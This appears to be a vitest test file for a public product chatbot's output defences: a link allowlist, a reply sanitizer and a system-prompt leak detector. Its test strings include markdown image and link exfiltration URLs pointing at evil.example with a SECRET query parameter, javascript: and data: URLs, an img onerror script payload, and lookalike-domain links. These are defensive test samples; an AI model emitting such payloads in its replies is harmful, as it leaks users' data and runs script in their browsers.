import { describe, expect, it } from 'vitest';
import { isAllowedLink } from './links';
import { PUBLIC_RULES } from './prompt';
import { leaksPrompt, sanitizeReply } from './sanitize';

describe('isAllowedLink', () => {
  it('allows our pages, knowall.ai and the repository', () => {
    for (const href of [
      '/install',
      '/security',
      '/',
      '/#faq',
      'https://knowall.ai',
      'https://getbook.ie/privacy',
      'https://github.com/knowall-ai/bookie',
    ]) {
      expect(isAllowedLink(href), href).toBe(true);
    }
  });

  it('refuses everything else', () => {
    for (const href of [
      'https://evil.example/x',
      'https://knowall.ai.evil.example',
      'https://knowall.ai/?q=secret',
      'http://knowall.ai',
      'javascript:alert(1)',
      'data:text/html,hi',
      'https://user:pw@knowall.ai',
      'https://github.com/someone/else',
      '//evil.example',
      '/api/public/chat',
    ]) {
      expect(isAllowedLink(href), href).toBe(false);
    }
  });
});

describe('sanitizeReply', () => {
  it('strips images and foreign links (exfiltration)', () => {
    const out = sanitizeReply(
      'Here ![x](https://evil.example/p.png?d=SECRET) and [click](https://evil.example/?d=SECRET) or [install](/install).'
    );
    expect(out).not.toMatch(/evil|SECRET/);
    expect(out).toContain('[install](/install)');
    expect(out).toContain('click');
  });

  it('removes bare foreign URLs and HTML', () => {
    const out = sanitizeReply(
      'See https://evil.example/a?b=c and <img src=x onerror=alert(1)> https://knowall.ai.'
    );
    expect(out).not.toMatch(/evil|<img|onerror/);
    expect(out).toContain('https://knowall.ai');
  });
});

describe('leaksPrompt', () => {
  it('spots a reply that reproduces the rules', () => {
    expect(leaksPrompt(PUBLIC_RULES.slice(0, 1500))).toBe(true);
  });

  it('does not flag a normal product answer', () => {
    expect(
      leaksPrompt(
        "I'm Bookie's public helper, so I can't see anyone's accounts. Bookie reads Xero and Business Central live through their official APIs. To book a demo, contact KnowAll AI at https://knowall.ai."
      )
    ).toBe(false);
  });
});
